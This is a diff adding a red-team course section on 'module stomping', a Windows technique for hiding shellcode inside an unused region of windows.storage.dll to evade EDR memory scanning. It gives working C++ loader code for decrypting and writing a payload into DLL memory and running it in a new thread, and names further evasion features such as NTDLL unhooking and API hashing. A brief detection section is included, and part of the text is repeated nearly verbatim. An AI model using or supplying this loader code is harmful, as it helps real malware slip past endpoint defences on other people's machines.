@@ -2402,3 +2402,486 @@ This batch file handles the compilation process for the implant.
 
 
 </details>
+
+
+
+<details>
+
+<summary>08 - Module Stomping</summary>
+
+## Overview
+
+Module Stomping is an advanced technique for hiding malicious payloads by overwriting unused sections of legitimate DLLs loaded in process memory. This approach helps evade detection by reducing suspicious memory artifacts that are typically flagged by security tools.
+
+## Technical Concept
+
+### The Problem: Memory Artifacts in Traditional Injection
+
+When executing payloads using traditional methods, several detectable artifacts are created:
+
+**Why These Are Problematic:**
+- EDR (Endpoint Detection and Response) solutions specifically scan for RWX memory regions
+- Memory scanning tools like PE-sieve can detect anomalous memory sections
+- Threads executing from non-image memory are immediate red flags
+- Forensic tools can easily identify these suspicious patterns
+
+### The Solution: Module Stomping
+
+**Core Principle:** "Hide in plain sight" by using existing, legitimate memory regions that are already marked as executable.
+
+**How It Works:**
+1. **Legitimate DLL Loading**: Load a DLL that's part of the Windows ecosystem but not used by your specific application
+2. **Memory Region Reuse**: Overwrite unused code caves or padding sections within the DLL
+3. **Execution Camouflage**: Execute payload from within the DLL's address space, making it appear as legitimate code
+
+## Step-by-Step Demonstration
+
+[02.Non-admin/03.ModuleStomp](https://github.com/Excalibra/RED-TEAM-OPERATOR-Evasion-Windows/tree/main/Files%20Windows%20Evasion/02.Non-admin/03.ModuleStomp)
+
+### Step 1: Traditional Payload Execution (Baseline)
+
+First, let's examine the detectable artifacts created by traditional payload execution:
+
+#### Compile and Run Baseline Implant
+
+```batch
+cd 08.ModuleStomp
+compile.bat
+implant.exe
+```
+
+<img width="1069" height="546" alt="image" src="https://github.com/user-attachments/assets/52682ea8-7f7c-46b6-80fd-f6c0333b8cfc" />
+
+
+**What Happens:**
+- The program allocates new executable memory using `VirtualAlloc`
+- Decrypts and copies the payload to this memory region
+- Creates a thread pointing to this new memory region
+- Executes the message box payload
+
+#### Analyze Memory Artifacts with Process Hacker
+
+<img width="1397" height="805" alt="image" src="https://github.com/user-attachments/assets/449d6244-6f74-41dd-b225-a5bf8a8db564" />
+
+**Memory Regions Analysis:**
+1. **Open Process Hacker** → Find your implant process → Memory tab
+2. **Look for RWX regions**: These show as "Execute/Read/Write" protection
+3. **Check "File" column**: Traditional injection shows "No file" for the allocated region
+4. **Note the address**: Matches exactly what your implant printed
+
+<img width="1447" height="718" alt="image" src="https://github.com/user-attachments/assets/967c23cc-a1d7-4d08-8c56-13f1fca5a8b9" />
+
+**Thread Analysis:**
+1. **Go to Threads tab**: Look for threads with start addresses in suspicious ranges
+   <img width="1008" height="749" alt="image" src="https://github.com/user-attachments/assets/16ab8e04-723e-4be7-b80d-8cd6a1a32889" />
+
+2. **Symbol resolution**: Process Hacker shows "unknown" for the thread start address
+3. **Call stack**: Shows the thread originated from non-image memory
+
+   <img width="994" height="740" alt="image" src="https://github.com/user-attachments/assets/b336d70c-924e-433b-bd44-3a9b91f7843e" />
+
+
+**Why This is Detectable:**
+```cpp
+// Current implementation uses traditional VirtualAlloc
+char * ptr = (char *) VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+printf("ptr: %p\n", ptr); getchar();
+
+// Decrypt and copy payload into newly allocated memory
+AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
+RtlMoveMemory(ptr, payload, payload_len);
+
+// Create thread pointing to this suspicious memory region
+CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
+```
+
+
+
+# Module Stomping: Hiding Payloads in Legitimate DLL Memory Regions
+
+## Overview
+
+Module Stomping is an advanced technique for hiding malicious payloads by overwriting unused sections of legitimate DLLs loaded in process memory. This approach helps evade detection by reducing suspicious memory artifacts that are typically flagged by security tools.
+
+## Technical Concept
+
+### The Problem: Memory Artifacts in Traditional Injection
+
+When executing payloads using traditional methods, several detectable artifacts are created:
+
+**Why These Are Problematic:**
+- EDR (Endpoint Detection and Response) solutions specifically scan for RWX memory regions
+- Memory scanning tools like PE-sieve can detect anomalous memory sections
+- Threads executing from non-image memory are immediate red flags
+- Forensic tools can easily identify these suspicious patterns
+
+### The Solution: Module Stomping
+
+**Core Principle:** "Hide in plain sight" by using existing, legitimate memory regions that are already marked as executable.
+
+**How It Works:**
+1. **Legitimate DLL Loading**: Load a DLL that's part of the Windows ecosystem but not used by your specific application
+2. **Memory Region Reuse**: Overwrite unused code caves or padding sections within the DLL
+3. **Execution Camouflage**: Execute payload from within the DLL's address space, making it appear as legitimate code
+
+## Step-by-Step Demonstration
+
+### Step 1: Traditional Payload Execution (Baseline)
+
+First, let's examine the detectable artifacts created by traditional payload execution using the current code:
+
+#### Compile and Run Baseline Implant
+
+```batch
+cd 08.ModuleStomping
+compile.bat
+implant.exe
+```
+
+Note the address displayed - this will be something like `0x7FF...200C`
+
+**What Happens in the Current Code:**
+```cpp
+// Current implementation uses traditional VirtualAlloc
+char * ptr = (char *) VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+printf("ptr: %p\n", ptr); getchar();
+
+// Decrypt and copy payload into newly allocated memory
+AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
+RtlMoveMemory(ptr, payload, payload_len);
+
+// Create thread pointing to this suspicious memory region
+CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
+```
+
+#### Analyze Memory Artifacts with Process Hacker
+
+**Memory Regions Analysis:**
+1. **Open Process Hacker** → Find your implant process → Memory tab
+2. **Look for RWX regions**: These show as "Execute/Read/Write" protection
+3. **Check "File" column**: The allocated region shows "No file" 
+4. **Note the address**: Matches exactly what your implant printed
+
+**Thread Analysis:**
+1. **Go to Threads tab**: Look for threads with start addresses in suspicious ranges
+2. **Symbol resolution**: Process Hacker shows "unknown" for the thread start address
+3. **Call stack**: Shows the thread originated from non-image memory
+
+**Why This is Detectable:**
+- RWX memory regions without file backing are huge red flags
+- Threads executing from non-image memory are immediately suspicious
+- Easy to detect with basic memory forensics
+
+### Step 2: Implement Module Stomping
+
+Now let's implement the Module Stomping technique by modifying the source code:
+
+#### Code Modification Explained
+
+**Current Code (Traditional - Comment Out):**
+```cpp
+char * ptr = (char *) VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+```
+
+**Module Stomping Implementation (Uncomment):**
+```cpp
+char * ptr = (char *) hVictimLib + 2*4096 + 12;
+```
+
+<img width="1679" height="836" alt="image" src="https://github.com/user-attachments/assets/57510dae-e117-4b81-927b-616371a7b48c" />
+
+
+**What This Does:**
+- `hVictimLib` is the base address of Windows.Storage.dll (loaded via `LoadLibrary`)
+- `2*4096` = 2 memory pages (0x2000 bytes) - skips main code sections
+- `+ 12` = additional offset into the third page (0xC bytes)
+- This targets unused/padding regions within the DLL
+
+#### The Complete Module Stomping Process
+
+```cpp
+// Step 1: Load a legitimate but unused DLL
+unsigned char sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
+HMODULE hVictimLib = LoadLibrary((LPCSTR) sLib);
+
+if ( hVictimLib != NULL ) {
+    // Step 2: Calculate target address within the DLL
+    // 2 pages (8192 bytes) + 12 bytes into third page
+    char * ptr = (char *) hVictimLib + 2*4096 + 12;
+    
+    printf("ptr: %p\n", ptr); getchar();
+
+    // Step 3: Change memory protection to allow writing
+    DWORD oldprotect = 0;        
+    VirtualProtect_p((char *) ptr, payload_len + 4096, PAGE_READWRITE, &oldprotect);
+    
+    // Step 4: Decrypt and copy payload into the DLL memory
+    AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
+    RtlMoveMemory(ptr, payload, payload_len);
+
+    // Step 5: Restore original protection (already executable)
+    VirtualProtect_p((char *) ptr, payload_len + 4096, oldprotect, &oldprotect);
+
+    // Step 6: Execute from legitimate DLL space
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE) ptr, NULL, 0, 0);
+}
+```
+
+#### Recompile and Test
+
+```batch
+compile.bat
+implant.exe
+```
+
+#### Analyze the Differences
+
+<img width="1389" height="807" alt="image" src="https://github.com/user-attachments/assets/c38f9cc5-4505-460a-8f00-4cdc2b44288b" />
+
+**Memory Regions Analysis:**
+- **No standalone RWX regions**: All executable memory is backed by DLL files
+- **File association**: The memory region now shows "windows.storage.dll" in the File column
+- **Legitimate appearance**: The memory protection matches typical DLL memory
+
+<img width="997" height="733" alt="image" src="https://github.com/user-attachments/assets/9d892f9e-c244-42d5-85ad-3845aec25c90" />
+
+**Thread Analysis:**
+- **Resolved symbols**: Process Hacker now shows the thread originating from `windows.storage.dll+0x200C`
+- **Legitimate call stack**: Appears as if the thread is executing legitimate DLL code
+- **No "unknown" regions**: All memory addresses can be resolved to known modules
+
+### Step 3: Technical Deep Dive
+
+#### How DLL Memory Layout Works
+
+**Typical DLL Structure in Memory:**
+```
++---------------------+
+| DOS Header          |  ← hVictimLib (base address)
++---------------------+
+| PE Header           |
++---------------------+
+| .text section       |  ← Executable code (usually starts around 0x1000)
++---------------------+
+| .data section       |  ← Read/write data
++---------------------+
+| .rdata section      |  ← Read-only data
++---------------------+
+| Padding/Alignment   |  ← Our target: hVictimLib + 0x200C
++---------------------+
+```
+
+**Why 0x200C (2*4096 + 12) Works:**
+- **2*4096** = 0x2000 bytes - skips two full memory pages
+- **+12** = 0xC bytes into the third page
+- This area typically contains:
+  - Code alignment padding
+  - Unused function stubs
+  - INT3 instructions (0xCC) for debugging
+  - Generally not critical for DLL functionality
+
+#### Debugger Analysis - Step by Step
+
+**Step 1: Run and Attach**
+```batch
+implant.exe
+```
+Note the address displayed - this will be something like `0x7FF...200C`
+
+**Step 2: Examine the Target Address Before Stomping**
+In your debugger:
+```
+Go to Expression (Ctrl+G): [the address shown]
+```
+
+<img width="1681" height="829" alt="image" src="https://github.com/user-attachments/assets/98d67871-88fb-4535-a746-c280a9b6a189" />
+
+
+**Before Stomping (Expected):**
+```
+windows.storage.dll + 0x200C:
+CC CC CC CC CC CC CC CC   ; INT3 instructions (breakpoints)
+CC CC CC CC CC CC CC CC   ; Typical padding bytes
+CC CC CC CC CC CC CC CC   ; Unused region
+```
+
+<img width="1679" height="831" alt="image" src="https://github.com/user-attachments/assets/b9eae9aa-f35e-440d-a5e6-0b5a9a05d053" />
+
+**After Stomping:**
+```
+windows.storage.dll + 0x200C:
+E8 1F 00 00 00          ; call instruction (part of shellcode)
+48 83 EC 28             ; sub rsp, 0x28
+...                     ; Rest of decrypted payload
+```
+
+<img width="1680" height="819" alt="image" src="https://github.com/user-attachments/assets/c1796310-9234-4e31-a61a-5c4775bf8103" />
+
+
+**Step 3: Verify the Overwrite**
+The `RtlMoveMemory(ptr, payload, payload_len)` call overwrites the INT3 padding with our actual shellcode.
+
+### Step 4: DLL Selection Strategy
+
+#### Why Windows.Storage.dll?
+
+**Good Characteristics:**
+- **Large size**: Plenty of unused space for payloads
+- **System DLL**: Legitimate part of Windows, doesn't raise suspicion
+- **Not commonly used**: Most applications don't actively use storage functionality
+- **Always available**: Part of standard Windows installations
+
+#### Finding Safe Offsets
+
+**Methods Used in This Implementation:**
+1. **Page-based offset**: `2*4096 + 12` - uses memory page boundaries
+2. **Empirical testing**: This offset was likely tested to ensure stability
+3. **Padding targeting**: Aims for alignment padding rather than active code
+
+**How to Find Your Own Safe Offsets:**
+```cpp
+// Method 1: Static analysis with PE editors
+// Method 2: Search for INT3 sequences (0xCC)
+// Method 3: Test different offsets and monitor for crashes
+
+// Example: Search for safe region
+for (DWORD offset = 0x1000; offset < 0x10000; offset += 0x1000) {
+    PBYTE testAddr = (PBYTE)hVictimLib + offset;
+    if (IsSafeToOverwrite(testAddr, payload_len)) {
+        return testAddr;
+    }
+}
+```
+
+### Step 5: Advanced Considerations
+
+#### Payload Size Limitations
+
+**In This Implementation:**
+- The payload is AES-encrypted MessageBox shellcode
+- Size is relatively small (fits in padding regions)
+- For larger payloads, you'd need to find larger unused sections
+
+**Strategies for Larger Payloads:**
+```cpp
+// Option 1: Multiple stomping locations
+PVOID stomp1 = FindStompingLocation(hDll1, payloadPart1, size1);
+PVOID stomp2 = FindStompingLocation(hDll2, payloadPart2, size2);
+
+// Option 2: Stager payload
+// Small loader in DLL that fetches larger payload
+```
+
+#### Memory Protection Details
+
+**Key Points:**
+- The DLL memory is already `PAGE_EXECUTE_READ` by default
+- We temporarily change to `PAGE_READWRITE` to write our payload
+- We restore the original protection (which includes execute permissions)
+- No need for `PAGE_EXECUTE_READWRITE` - the memory is already executable!
+
+### Step 6: Anti-Forensics Benefits
+
+#### What We Avoid:
+
+1. **No New RWX Regions**: 
+   - Traditional: `VirtualAlloc(..., PAGE_EXECUTE_READWRITE)`
+   - Module Stomping: Uses existing executable memory
+
+2. **File-Backed Memory**:
+   - Traditional: "No file" in memory listings
+   - Module Stomping: Shows "windows.storage.dll"
+
+3. **Thread Origin Obfuscation**:
+   - Traditional: Thread from unknown memory
+   - Module Stomping: Thread from legitimate DLL
+
+#### Detection Evasion:
+
+```cpp
+// Traditional (easily detected):
+// - RWX memory region
+// - No file backing
+// - Unknown thread origins
+
+// Module Stomping (stealthy):
+// - Uses existing RX memory
+// - File-backed (windows.storage.dll)
+// - Legitimate-looking thread origins
+```
+
+## Detection and Mitigation
+
+### How EDRs Can Still Detect This
+
+**Behavioral Detection:**
+- DLLs loaded but not used by application pattern
+- Unusual memory protection changes on image regions
+- Write operations to .text sections of DLLs
+
+**Memory Forensics:**
+- Hash verification of critical DLL sections
+- Detection of modified code in typically unused regions
+- Suspicious code patterns in padding areas
+
+### Defensive Strategies
+
+**Code Integrity Checks:**
+```cpp
+BOOL VerifyDLLIntegrity(HMODULE hModule) {
+    // Calculate hash of critical sections
+    // Compare against known good hashes
+    // Alert on mismatches in typically unused regions
+}
+```
+
+**Memory Protection Monitoring:**
+- Alert on write operations to image memory regions
+- Monitor for `VirtualProtect` calls targeting DLL .text sections
+
+## Building the Project
+
+### Prerequisites
+
+- Visual Studio 2019 or later
+- Windows SDK
+- C++ development tools
+
+### Compilation
+
+```batch
+cd 08.ModuleStomping
+compile.bat
+```
+
+## Code Explanation
+
+### Key Functions in the Implant
+
+**AESDecrypt:**
+- Decrypts the payload using Windows Crypto API
+- Uses AES-256 with SHA-256 key derivation
+
+**UnhookNtdll:**
+- Loads fresh NTDLL from disk and copies .text section
+- Removes any EDR hooks before executing payload
+
+**XORcrypt:**
+- Simple XOR obfuscation for strings
+- Used to hide NTDLL path from static analysis
+
+### Security Features
+
+1. **String Obfuscation**: Critical strings are XOR encrypted
+2. **API Hashing**: Uses custom string-based GetProcAddress
+3. **ETW Unhooking**: Removes EDR hooks before execution
+4. **Payload Encryption**: AES-encrypted shellcode
+
+## References
+
+- Windows PE File Format Specification
+- Microsoft DLL Loading Documentation  
+- Memory Forensics Techniques
+- EDR Bypass Research Papers
+
+</details>
